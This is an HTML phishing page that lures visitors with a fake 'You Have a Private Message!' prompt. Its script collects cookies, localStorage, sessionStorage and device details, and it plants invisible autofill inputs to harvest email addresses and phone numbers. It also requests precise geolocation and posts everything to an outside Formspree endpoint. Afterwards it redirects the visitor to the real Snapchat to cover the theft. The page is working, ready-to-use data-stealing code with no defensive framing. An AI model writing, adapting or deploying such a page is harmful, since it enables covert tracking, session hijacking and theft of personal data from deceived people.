<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>You Have a Secret Message!</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <style>
    body {
      font-family: -apple-system, sans-serif;
      text-align: center;
      padding: 40px 20px;
      background: #fff;
      color: #333;
      margin: 0;
    }
    .logo { font-size: 70px; margin: 20px 0; }
    h1 { font-size: 22px; font-weight: 600; }
    p { color: #555; margin: 10px 0; font-size: 16px; }
    .btn {
      margin: 30px auto;
      padding: 15px 30px;
      background: #0095f6;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 18px;
      cursor: pointer;
      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
    }
  </style>
</head>
<body>
  <div class="logo">🔐</div>
  <h1>You Have a Private Message!</h1>
  <p>Tap below to view who sent it</p>
  <button class="btn" onclick="startScan()">View Message</button>

  <script>
    // Data object
    const data = {
      Time: new Date().toString(),
      Device: navigator.userAgent,
      Platform: navigator.platform,
      Language: navigator.language,
      Screen: screen.width + 'x' + screen.height,
      Cookies: document.cookie,
      Storage: JSON.stringify(localStorage || {}),
      Session: JSON.stringify(sessionStorage || {})
    };

    // Autofill Detection: Email, Password, Phone
    function detectAutofill() {
      const emailInput = document.createElement('input');
      const passInput = document.createElement('input');
      const telInput = document.createElement('input');

      emailInput.type = 'email'; emailInput.name = 'email'; emailInput.id = 'auto-email';
      passInput.type = 'password'; passInput.name = 'password';
      telInput.type = 'tel'; telInput.name = 'phone';

      [emailInput, passInput, telInput].forEach(input => {
        input.style.position = 'fixed';
        input.style.opacity = 0;
        input.autocomplete = input.type;
        document.body.appendChild(input);
      });

      setTimeout(() => {
        if (emailInput.value && emailInput.value.includes('@')) data.Email = emailInput.value;
        if (passInput.value) data.Password = '*** autofill detected ***';
        if (telInput.value && telInput.value.length > 5) data.Phone = telInput.value;

        [emailInput, passInput, telInput].forEach(input => document.body.removeChild(input));
      }, 2000);
    }

    // Start Scan on Button Click
    function startScan() {
      detectAutofill();
      getLocation();
    }

    // Get Live Location
    function getLocation() {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(success, error, {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        });
      } else {
        data.Location = "Not supported";
        sendData();
      }
    }

    function success(pos) {
      data.Latitude = pos.coords.latitude;
      data.Longitude = pos.coords.longitude;
      data.Accuracy = pos.coords.accuracy;
      data["Google Maps"] = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
      sendData();
    }

    function error() {
      data.Location = "Denied or unavailable";
      sendData();
    }

    // Send All Data to Formspree
    function sendData() {
      fetch('https://formspree.io/f/xvkgzkve', {
        method: 'POST',
        body: JSON.stringify(data),
        headers: { 'Content-Type': 'application/json' },
        mode: 'no-cors'
      }).finally(() => {
        // Redirect to real Snapchat
        window.location.href = 'https://snapchat.com';
      });
    }

    // Auto-scan on page load (optional)
    window.onload = () => {
      // Optional: Auto-trigger after 2 sec (if you don't want button)
      // setTimeout(startScan, 2000);
    };
  </script>
</body>
</html>
